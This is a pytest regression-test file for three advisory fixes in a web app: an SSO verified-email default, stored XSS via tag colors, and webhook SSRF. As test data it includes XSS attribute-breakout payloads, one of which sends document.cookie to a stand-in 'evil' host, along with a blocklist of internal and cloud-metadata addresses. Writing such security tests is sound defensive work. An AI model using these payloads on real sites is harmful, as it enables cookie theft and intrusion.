"""Regression tests for three security-advisory fixes.

- GHSA-w4q5-3526-j82j: SSO account takeover via unverified email (insecure default)
- GHSA-2m89-mxcv-gv93: Webhook SSRF via DNS rebinding (TOCTOU)
- GHSA-pp32-69wg-97h3: Stored XSS via group tag color (HTML attribute breakout)
"""

import http.server
import os
import sys
import threading
import uuid

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.app import app, db, bcrypt
from src.models import User

app.config['WTF_CSRF_ENABLED'] = False


def _mk_user():
    u = User(username=f'u_{uuid.uuid4().hex[:8]}', email=f'{uuid.uuid4().hex[:8]}@ex.com',
             password=bcrypt.generate_password_hash('Passw0rd!').decode(), email_verified=True)
    db.session.add(u)
    db.session.commit()
    return u


def _login(client, user_id):
    with client.session_transaction() as sess:
        sess['_user_id'] = str(user_id)
        sess['_fresh'] = True


# =========================================================================
# GHSA-w4q5-3526-j82j — SSO verified-email default
# =========================================================================

def test_sso_require_verified_email_defaults_true(monkeypatch):
    monkeypatch.delenv('SSO_REQUIRE_VERIFIED_EMAIL', raising=False)
    from src.auth.sso import get_sso_config
    assert get_sso_config()['require_verified_email'] is True


def test_sso_require_verified_email_can_be_opted_out(monkeypatch):
    from src.auth.sso import get_sso_config
    monkeypatch.setenv('SSO_REQUIRE_VERIFIED_EMAIL', 'false')
    assert get_sso_config()['require_verified_email'] is False
    monkeypatch.setenv('SSO_REQUIRE_VERIFIED_EMAIL', 'true')
    assert get_sso_config()['require_verified_email'] is True


# =========================================================================
# GHSA-pp32-69wg-97h3 — tag color validation (stored XSS)
# =========================================================================

def test_validate_tag_color_unit():
    from src.api.tags import _validate_tag_color
    for good in ['#3B82F6', '#abc', '#ABCDEF', '#12345678', None]:
        ok, _ = _validate_tag_color(good)
        assert ok, good
    for bad in ['red', 'red" onmouseover=alert(1)', '#xyz', '#12', 'javascript:alert(1)',
                '#3B82F6; x', '  #3B82F6" onclick="x']:
        ok, _ = _validate_tag_color(bad)
        assert not ok, bad


def test_create_tag_rejects_attribute_breakout_color():
    with app.app_context():
        u = _mk_user()
        client = app.test_client()
        _login(client, u.id)
        payload = {'name': 'Malicious', 'color': 'red" onmouseover="fetch(`//evil?c=`+document.cookie)'}
        r = client.post('/api/tags', json=payload)
        assert r.status_code == 400
        assert 'hex' in r.get_json().get('error', '').lower()


def test_create_tag_accepts_valid_hex_color():
    with app.app_context():
        u = _mk_user()
        client = app.test_client()
        _login(client, u.id)
        r = client.post('/api/tags', json={'name': f't_{uuid.uuid4().hex[:6]}', 'color': '#0af'})
        assert r.status_code in (200, 201), r.get_data(as_text=True)


def test_update_tag_rejects_bad_color():
    with app.app_context():
        u = _mk_user()
        client = app.test_client()
        _login(client, u.id)
        created = client.post('/api/tags', json={'name': f't_{uuid.uuid4().hex[:6]}', 'color': '#123456'})
        tag_id = created.get_json()['tag']['id'] if 'tag' in (created.get_json() or {}) else created.get_json().get('id')
        r = client.put(f'/api/tags/{tag_id}', json={'color': 'blue" autofocus onfocus=alert(1)'})
        assert r.status_code == 400


# =========================================================================
# GHSA-2m89-mxcv-gv93 — webhook SSRF (connect-time peer guard)
# =========================================================================

def test_is_blocked_ip_classifies_addresses():
    from src.services.webhook_dispatch import _is_blocked_ip
    for blocked in ['127.0.0.1', '169.254.169.254', '10.0.0.5', '192.168.1.1',
                    '172.16.0.1', '::1', '0.0.0.0', 'fe80::1', 'not-an-ip']:
        assert _is_blocked_ip(blocked) is True, blocked
    for allowed in ['8.8.8.8', '1.1.1.1', '2606:4700:4700::1111']:
        assert _is_blocked_ip(allowed) is False, allowed


def test_ssrf_guard_blocks_loopback_before_sending_body():
    """The core rebinding defense: a connection whose real peer is 127.0.0.1 is
    aborted after connect but before the request body is sent, so the local
    server never receives the payload."""
    received = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            received.append(self.rfile.read(int(self.headers.get('Content-Length', 0))))
            self.send_response(200)
            self.end_headers()

        def log_message(self, *args):
            pass

    server = http.server.HTTPServer(('127.0.0.1', 0), Handler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        from src.services.webhook_dispatch import ssrf_guarded_session
        session = ssrf_guarded_session()
        with pytest.raises(Exception) as exc:
            session.post(f'http://127.0.0.1:{port}/hook', data=b'secret-payload', timeout=5)
        # The abort reason should mention the blocked peer.
        assert 'blocked address' in str(exc.value) or '127.0.0.1' in str(exc.value)
        # And the server must never have received the payload.
        assert received == []
    finally:
        server.shutdown()


def test_host_allowlist_relaxes_guard(monkeypatch):
    from src.services import webhook_dispatch as wd
    monkeypatch.setenv('WEBHOOK_INTRANET_HOST_ALLOWLIST', r'^internal\.example$')
    assert wd._host_is_allowlisted('http://internal.example/hook') is True
    assert wd._host_is_allowlisted('http://internal.example.evil.com/hook') is False
    assert wd._host_is_allowlisted('http://8.8.8.8/hook') is False
    monkeypatch.delenv('WEBHOOK_INTRANET_HOST_ALLOWLIST', raising=False)
    assert wd._host_is_allowlisted('http://internal.example/hook') is False
